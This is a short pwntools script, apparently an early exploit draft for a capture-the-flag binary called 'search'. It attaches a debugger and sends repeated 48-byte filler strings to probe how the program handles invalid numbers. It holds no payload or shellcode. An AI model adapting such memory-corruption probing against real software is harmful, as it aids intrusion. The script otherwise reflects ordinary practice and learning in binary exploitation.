from pwn import *
context.log_level = 'debug'

p = process("./search")
gdb.attach(p)

p.readuntil('3: Quit\n')
p.sendline('a'*48)
p.readuntil('is not a valid number\n')
p.sendline('a'*48)
p.readuntil('is not a valid number\n')
p.sendline('a'*48)
raw_input()
p.readall(timeout=0.1)
p.sendline('a'*48)
p.readall(timeout=0.1)
p.interactive()
